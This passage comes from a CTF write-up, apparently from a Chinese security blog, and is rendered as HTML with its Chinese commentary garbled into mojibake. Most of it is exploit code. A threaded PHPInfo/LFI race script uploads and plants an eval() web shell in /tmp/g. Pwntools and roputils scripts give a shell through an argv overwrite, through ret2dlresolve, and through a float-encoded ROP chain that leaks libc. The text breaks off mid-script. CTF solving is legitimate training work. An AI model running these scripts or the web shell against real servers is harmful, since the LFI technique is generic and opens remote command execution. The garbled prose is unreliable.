class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114235-163015cc-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114235-163015cc-a457-1.png" alt="img"></a></p><p>è¿è¡Œè„šæœ¬<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114247-1d6315ec-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114247-1d6315ec-a457-1.png" alt="img"></a></p><p>ï¼ˆè¡¨ç¤ºåæ¥æ²¡æœ‰ä¸Šä¼ æˆåŠŸï¼Œä½†ä¼¼ä¹æœ‰å¤§ä½¬å…ˆä¸Šä¼ æˆåŠŸäº†ï¼Œæ‰€ä»¥åé¢çš„æ­¥éª¤æˆ‘ä¹Ÿèƒ½ç»§ç»­åšï¼‰<br>å…ˆéªŒè¯æ˜¯å¦ä¸Šä¼ æˆåŠŸ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114308-2a39218a-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114308-2a39218a-a457-1.png" alt="img"></a></p><p>å—¯ï¼Œçš„ç¡®æœ‰å¤§ä½¬ä¸Šä¼ æˆåŠŸäº†ï¼Œè¿æ–‡ä»¶åä¹Ÿä¸€æ ·ï¼Œå¥½çš„ï¼Œè°¢è°¢äº†ã€‚getsheell<br>äºæ˜¯<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114320-30ea4d1a-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114320-30ea4d1a-a457-1.png" alt="img"></a><br>flagåº”è¯¥åœ¨é‚£ä¸ªå¥‡æ€ªåå­—çš„æ–‡ä»¶é‡Œå§<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114328-35b74f00-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114328-35b74f00-a457-1.png" alt="img"></a><br>æœç„¶ï¼Œ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114335-3a4e6094-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114335-3a4e6094-a457-1.png" alt="img"></a><br>æ‹¿åˆ°flag<br>è¿™é¢˜çš„å…³é”®è¿˜æ˜¯ä¸Šä¼ æœ‰å¤§é‡åƒåœ¾æ•°æ®çš„æ¶æ„æ–‡ä»¶å§ã€‚ï¼ˆæ‰€ä»¥å“ªä½å¤§ä½¬ä¸Šä¼ æˆåŠŸäº†ï¼‰</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="hardpwn"><a href="#hardpwn" class="headerlink" title="hardpwn"></a>hardpwn</h3><p>å¯¼å…¥IDAåï¼Œå‘ç°éœ€è¦è¦†ç›–è¿è¡Œå‚æ•°ï¼ˆå³argvï¼‰ï¼Œå› ä¸ºæ ˆæº¢å‡ºå¾ˆé•¿ä¸”å¯ä»¥è¦†ç›–åˆ°è¯¥å‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘ç›´æ¥è¦†ç›–</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="built_in">import</span> *</span><br><span class="line">context.<span class="attr">log_level</span> = <span class="string">"debug"</span></span><br><span class="line">context.<span class="attr">arch</span> = <span class="string">"amd64"</span></span><br><span class="line"><span class="attr">elf</span> = ELF(<span class="string">"pwn1"</span>)</span><br><span class="line"><span class="attr">sh</span> = <span class="number">0</span></span><br><span class="line"><span class="attr">lib</span> = <span class="number">0</span></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    <span class="keyword">if</span>(<span class="attr">debug</span> == <span class="number">1</span>):</span><br><span class="line">        <span class="attr">sh</span> = process(<span class="string">"./pwn1"</span>)</span><br><span class="line">    <span class="keyword">else</span>:   </span><br><span class="line">        <span class="attr">sh</span> = remote(ip,port)</span><br><span class="line">    <span class="attr">payload</span> = '\x00' * <span class="number">120</span> +<span class="string">"aaaa"</span> + <span class="string">"\x00"</span></span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    pwn(<span class="string">"47.110.227.208"</span>,<span class="number">10001</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114354-45684e40-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114354-45684e40-a457-1.png" alt="img"></a></p><h3 id="stackpwn"><a href="#stackpwn" class="headerlink" title="stackpwn"></a>stackpwn</h3><p>å¯¼å…¥IDAåï¼Œå‘ç°æ²¡æœ‰putsã€writeç­‰ï¼Œåªæœ‰readä¸”æœ‰æº¢å‡ºï¼Œé‚£ä¹ˆè¿™é“é¢˜å°±æ˜¯å…¸å‹çš„è€ƒå¯Ÿret2dlresolveï¼Œç”¨ctf-wikiçš„è„šæœ¬æ”¹ä¸€ä¸‹å°±å¯ä»¥æ‹¿åˆ°shelläº†<br>åˆ©ç”¨roputilsç®€åŒ–æ”»å‡»</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">from pwn import remote   <span class="comment">#r = process('./pwn3')</span></span><br><span class="line">r = remote(<span class="string">"47.110.227.208"</span>,10003)</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">rop = ROP('./pwn3')</span><br><span class="line">offset = 60</span><br><span class="line">bss_base = 0x804a000 + 0x800</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line">buf += rop.call('read', 0, bss_base, 100)</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line">buf = rop.string('/bin/sh')</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, 'system')</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114455-69fd66c8-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114455-69fd66c8-a457-1.png" alt="img"></a></p><h3 id="floatpwn"><a href="#floatpwn" class="headerlink" title="floatpwn"></a>floatpwn</h3><p>è¿™é¢˜è€ƒå¯Ÿäº†ç¡®å®šæµ®ç‚¹å¯„å­˜å™¨é€šè¿‡movsså†™å…¥å†…å­˜æ—¶çš„æ•°å€¼<br>æ–¹æ³•ï¼šåªèƒ½äººå·¥äºŒåˆ†æ³•ä¸€æ¬¡ä¸€æ¬¡å»å°è¯•ï¼Œç„¶åå‘ç°å°æ•°ç‚¹å45ä½ä¹‹å‰å¯ä»¥å¿½ç•¥ä¸è®¡ï¼ŒçœŸæ­£å¼€å§‹æœ‰æ„ä¹‰çš„æ•°å€¼åœ¨å°æ•°ç‚¹å45ä½å¼€å§‹ã€‚ç„¶åæ±‚å‡ºå¯¹åº”çš„nä½¿å¾—å†™å›å†…å­˜æ—¶æ˜¯æˆ‘æƒ³è¦çš„æ•°å€¼ï¼Œä»è€Œæ„é€ ROPé“¾ã€‚ä½†æ˜¯æƒ³æ„é€ ROPé“¾ä¹‹å‰éœ€è¦å®ç°æ— é™å†™ï¼Œæ‰€ä»¥è¾“å…¥sizeæ—¶ï¼Œå¯ä»¥è€ƒè™‘è¾“å…¥è´Ÿæ•°ï¼Œå®ç°æ— ç¬¦å·æ•´æ•°æº¢å‡ºï¼Œä»è€Œæ— é™å†™ã€‚å› ä¸ºæ§åˆ¶å†™å…¥æ•°æ®ä½ç½®çš„iå˜é‡ä½äºæ ˆç©ºé—´åº•éƒ¨ï¼Œæ‰€ä»¥è¦ä½¿å¾—å†™åˆ°ié‡Œçš„æ•°æ®ä¸º10åˆ°12å³å¯ï¼Œå› ä¸ºå¯ä»¥è€ƒè™‘ç›´æ¥ç•¥è¿‡ebpï¼Œç›´æ¥ä¿®æ”¹ripã€‚</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">elf = ELF(<span class="string">"pwn2"</span>)</span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line">lib = <span class="number">0</span></span><br><span class="line">def inputFloat(<span class="built_in">num</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.<span class="built_in">send</span>(<span class="built_in">num</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline()</span><br><span class="line">def inputRop(<span class="built_in">num</span>):</span><br><span class="line">    <span class="built_in">num</span> = str(<span class="built_in">num</span>)</span><br><span class="line">    <span class="built_in">num</span> = <span class="built_in">num</span>.rjust(<span class="number">45</span>,<span class="string">"0"</span>)</span><br><span class="line">    <span class="built_in">num</span> = <span class="built_in">num</span>.ljust(<span class="number">0x62</span>,<span class="string">"0"</span>)</span><br><span class="line">    inputFloat(<span class="string">"0."</span> + <span class="built_in">num</span>)</span><br><span class="line">    inputFloat(<span class="string">"0"</span>) </span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    <span class="built_in">global</span> sh</span><br><span class="line">    <span class="built_in">global</span> lib</span><br><span class="line">    <span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">        sh = <span class="built_in">process</span>(<span class="string">"./pwn2"</span>)</span><br><span class="line">        lib = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF(<span class="string">"libc6_2.27-3ubuntu1_amd64.so"</span>)</span><br><span class="line">    <span class="comment">#puts 5879714 0x400640</span></span><br><span class="line">    <span class="comment">#pop_rdi 5881041 0x4009f3</span></span><br><span class="line">    <span class="comment">#__libc_start_main_got 8822026 0x601038</span></span><br><span class="line">    <span class="comment">#main 5880847 0x400969</span></span><br><span class="line">    <span class="comment">#start 5879938 0x4006E0</span></span><br><span class="line">    <span class="comment">#call vul 5880867 0x400977</span></span><br><span class="line">    <span class="comment">#vul 5880653 0x4008DE</span></span><br><span class="line">    <span class="comment">#read 5879781 0x400670</span></span><br><span class="line">    <span class="comment">#pop_rsi_r15_ret 5881038 0x4009f1</span></span><br><span class="line">    <span class="comment">#read_got 8822014 0x601030</span></span><br><span class="line">    <span class="comment">#binsh 8822106 0x601071</span></span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(<span class="string">"-1.9999"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">        inputFloat(<span class="string">"111"</span>)</span><br><span class="line">    inputFloat(<span class="string">"13"</span>)</span><br><span class="line">    inputFloat(<span class="string">"13"</span>)</span><br><span class="line">    inputFloat(<span class="string">"0."</span> + <span class="string">"0"</span> * <span class="number">43</span> + <span class="string">"23"</span>)<span class="comment">#0x11</span></span><br><span class="line">    inputFloat(<span class="string">"0."</span> + <span class="string">"0"</span> * <span class="number">43</span> + <span class="string">"23"</span>)<span class="comment">#fake</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#rip = 0x4009f3</span></span><br><span class="line">    <span class="comment">#pop_rdi_ret</span></span><br><span class="line">    inputRop(<span class="number">5881041</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#__libc_start_main got</span></span><br><span class="line">    inputRop(<span class="number">8822026</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#puts_plt</span></span><br><span class="line">    inputRop(<span class="number">5879714</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rdi_ret</span></span><br><span class="line">    inputRop(<span class="number">5881041</span>)</span><br><span class="line">    inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rsi_r15_ret</span></span><br><span class="line">    inputRop(<span class="number">5881038</span>)</span><br><span class="line">    inputRop(<span class="number">8822106</span>)</span><br><span class="line">    inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#read_plt</span></span><br><span class="line">    inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rdi_ret</span></span><br><span class="line">    inputRop(<span class="number">5881041</span>)</span><br><span class="line">    inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rsi_r15_ret</span></span><br><span class="line">    inputRop(<span class="number">5881038</span>)</span><br><span class="line">    inputRop(<span class="number">8822014</span>)</span><br><span class="line">    inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#read_plt</span></span><br><span class="line">    inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rdi_ret</span></span><br><span class="line">    inputRop(<span class="number">5881041</span>)</span><br><span class="line">    inputRop(<span class="number">8822106</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#read_plt</span></span><br><span class="line">    inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#input()</span></span><br><span class="line">    sh.recvuntil(<span class="string">"plz input your float:"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"do you want to continue?(y/n)"</span>)</span><br><span class="line">    sh.<span class="built_in">send</span>(<span class="string">"n"</span>)</span><br><span class="line"></span><br><span class="line">    __libc_start_main = u64(sh.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    libc = __libc_start_main - lib.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    <span class="keyword">system</span> = libc + lib.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh = libc + lib.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">    sh.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sh.sendline(p64(<span class="keyword">system</span>))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"__libc_start_main: "</span> + hex(__libc_start_main))</span><br><span class="line">    <span 